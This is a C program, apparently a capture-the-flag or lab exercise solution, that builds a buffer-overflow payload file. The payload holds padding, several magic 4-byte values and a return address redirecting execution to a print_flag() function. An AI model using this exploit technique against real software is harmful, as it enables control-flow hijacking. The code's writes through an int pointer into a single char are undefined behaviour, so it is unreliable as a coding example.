#include <stdio.h>
#include <stdlib.h>


// GENERARE PAYLOAD NAUGHTY
int main(){

FILE *file = fopen("naughty_payload", "w");

int i = 0;

// offset pana la primul sir
for(; i < 198; i++){
fprintf(file, "0");
}

char x;
int *p = &x;

// primul sir
*p = 163;
fprintf(file, "%c", x);
*p = 249;
fprintf(file, "%c", x);
*p = 154;
fprintf(file, "%c", x);
*p = 90;
fprintf(file, "%c", x);

// offset pana la al doilea sir
for(i = 202; i < 433; i++){
fprintf(file, "0");
}

// al doilea sir
*p = 160;
fprintf(file, "%c", x);
*p = 84;
fprintf(file, "%c", x);
*p = 153;
fprintf(file, "%c", x);
*p = 85;
fprintf(file, "%c", x);

// offset pana la al treilea sir
for(i = 437; i < 570; i++){
fprintf(file, "0");
}

// al treilea sir
*p = 163;
fprintf(file, "%c", x);
*p = 53;
fprintf(file, "%c", x);
*p = 236;
fprintf(file, "%c", x);
*p = 42;
fprintf(file, "%c", x);

// offset pana la al patrulea sir
for(i = 574; i < 778; i++){
fprintf(file, "0");
}

// al patrulea sir
*p = 209;
fprintf(file, "%c", x);
*p = 123;
fprintf(file, "%c", x);
*p = 61;
fprintf(file, "%c", x);
*p = 214;
fprintf(file, "%c", x);

// offset pana la al cincilea sir
for(i = 782; i < 1043; i++){
fprintf(file, "0");
}

// al cincilea sir
*p = 58;
fprintf(file, "%c", x);
*p = 191;
fprintf(file, "%c", x);
*p = 242;
fprintf(file, "%c", x);
*p = 231;
fprintf(file, "%c", x);

// offset pana la apelul functiei print_flag()
for(i = 1047; i < 1209;i++){
fprintf(file, "0");
}

// adresa de apel pentru functia print_flag()
*p = 177;
fprintf(file, "%c", x);
*p = 133;
fprintf(file, "%c", x);
*p = 4;
fprintf(file, "%c", x);
*p = 8;
fprintf(file, "%c", x);

fclose(file);
return 0;
}
